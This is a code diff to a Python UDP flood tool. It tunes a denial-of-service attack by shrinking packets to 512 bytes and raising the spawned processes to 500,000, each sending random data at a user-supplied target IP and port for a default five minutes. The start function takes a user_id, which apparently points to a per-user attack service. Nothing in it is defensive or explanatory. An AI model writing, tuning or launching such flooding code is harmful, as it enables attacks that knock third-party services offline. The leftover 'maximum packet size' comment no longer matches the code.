@@ -21,7 +21,7 @@ def udp_flood(target_ip, target_port, stop_flag, duration):
     start_time = time.time()
     while not stop_flag.is_set() and (time.time() - start_time < duration):
         try:
-            data = os.urandom(1496)  # Use maximum packet size
+            data = os.urandom(512)  # Use maximum packet size
             sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
@@ -30,7 +30,7 @@ def udp_flood(target_ip, target_port, stop_flag, duration):
 def start_udp_flood(user_id, target_ip, target_port, duration=300):  # Default 5 minutes
     stop_flag = multiprocessing.Event()
     processes = []
-    for _ in range(20000):  # Increase process count
+    for _ in range(500000):  # Increase process count
         process = multiprocessing.Process(target=udp_flood, args=(target_ip, target_port, stop_flag, duration))
         process.start()
         processes.append(process)
